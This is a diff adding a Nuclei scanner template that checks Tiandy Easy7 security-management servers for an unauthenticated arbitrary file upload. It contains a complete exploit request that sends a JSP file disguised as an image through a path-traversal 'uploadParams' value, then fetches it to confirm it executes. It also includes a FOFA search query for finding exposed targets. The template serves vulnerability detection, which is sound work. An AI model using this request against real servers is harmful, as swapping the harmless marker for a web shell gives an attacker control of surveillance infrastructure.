@@ -1,0 +1,48 @@
+id: tiandy-easy7-uploadMapServerBgImage-fileupload
+
+info:
+  name: 天地伟业Easy7综合管理平台 uploadMapServerBgImage 任意文件上传
+  author: PokerSec
+  severity: critical
+  description: 天地伟业Easy7综合管理平台采用分布式架构，融合模数混合切换显示、用户权限控制、数据存储点播等功能，具备智能检索、视频诊断等特色应用，能为各行业提供高效可靠的安防综合管理方案。天地伟业Easy7综合管理平台的/Easy7/rest/file/uploadMapServerBgImage接口存在任意文件上传漏洞，未经身份验证的攻击者可以通过该漏洞上传任意文件，从而控制目标服务器。
+  reference:
+    - https://github.com/Fyw0o/PokerSec-nuclei-templates/blob/4a8dd14a0c4bce8e98d3bf2e117705e9a11c16bd/poc-Easy7-uploadMapServerBgImage-uploadfile.yaml#L4
+    - https://mp.weixin.qq.com/s/A1OIWXLw7-QCodRUQwBCJQ
+  metadata:
+    verified: true/false
+    fofa-query: body="/images/ico/Easy7_logo_transparent.png"
+  tags: tiandy,fileupload,easy7
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |-
+        POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="uploadParams";
+
+        [{"path":"../Easy7/","name":"{{file_name}}.jsp"}]
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{file_name}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("{{file_content}}");%>
+        ------{{boundary}}--
+
+      - |+
+        GET /Easy7/{{file_name}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code_1==200 && status_code_2==200 && contains_all(body_2,"{{file_content}}")
